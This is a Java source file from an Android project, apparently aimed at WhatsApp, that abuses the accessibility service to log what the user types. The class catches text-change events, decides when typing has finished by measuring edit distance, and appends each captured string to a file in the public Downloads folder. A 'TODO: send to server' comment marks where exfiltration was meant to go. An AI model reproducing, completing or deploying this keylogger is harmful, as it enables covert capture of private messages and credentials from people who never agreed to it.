package com.example.afinal.whatsappaccessability;

import android.content.Context;
import android.os.Environment;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

/**
 * Created by Dor on 9/4/2017.
 */


//TODO: add notify function
public class TextChangeAccessibility {

    File file;
    private long firstHitTime;
    static private String previous;

    public TextChangeAccessibility()
    {
        firstHitTime = System.currentTimeMillis();
        previous = new String();
        file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "dor");
    }

    public synchronized void load(AccessibilityEvent event, Context context)
    {
        if(event.getEventType() != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED)
        {
            return;
        }
        String text = event.getText().toString();
        firstHitTime = System.currentTimeMillis();
        if(previous.isEmpty() == true ||  previous.length() < 2)
        {
            previous = text;
        }
        else
        {
            int distance = levenshteinDistance(previous, text);
            if(distance > 1)
            {
                if(!(distance == 2 && text.length() > 4))
                {
                   flush(previous);
                }
            }
        }
        previous = text;
    }


    public synchronized void notifyEvent()
    {
        long diff = System.currentTimeMillis() - firstHitTime;
        Log.e("Dordor", "Diff: " + diff + " previous: " + previous);
        if((diff >= 5000) && previous.length() >= 2 )
        {
            if (!previous.isEmpty()){
                flush(previous);
                previous = "";
            }else{
                Log.e("Dordor", "previous is empty while timeout");
            }

        }
    }

    private synchronized void flush(String str)
    {
        //TODO: send to server

        FileOutputStream outputStream;
        try {
            outputStream = new FileOutputStream(file,true);
            outputStream.write(str.getBytes());
            outputStream.write("\n".getBytes());
            outputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    private static int minimum(int a, int b, int c)
    {
        return Math.min(Math.min(a,b),c);
    }
    private int levenshteinDistance(String lhs, String rhs)
    {
        int[][] distance = new int[lhs.length() + 1][rhs.length() + 1];

        for (int i = 0; i <= lhs.length(); i++)
            distance[i][0] = i;
        for (int j = 1; j <= rhs.length(); j++)
            distance[0][j] = j;

        for (int i = 1; i <= lhs.length(); i++)
            for (int j = 1; j <= rhs.length(); j++)
                distance[i][j] = minimum(
                        distance[i - 1][j] + 1,
                        distance[i][j - 1] + 1,
                        distance[i - 1][j - 1] + ((lhs.charAt(i - 1) == rhs.charAt(j - 1)) ? 0 : 1));

        return distance[lhs.length()][rhs.length()];
    }
}
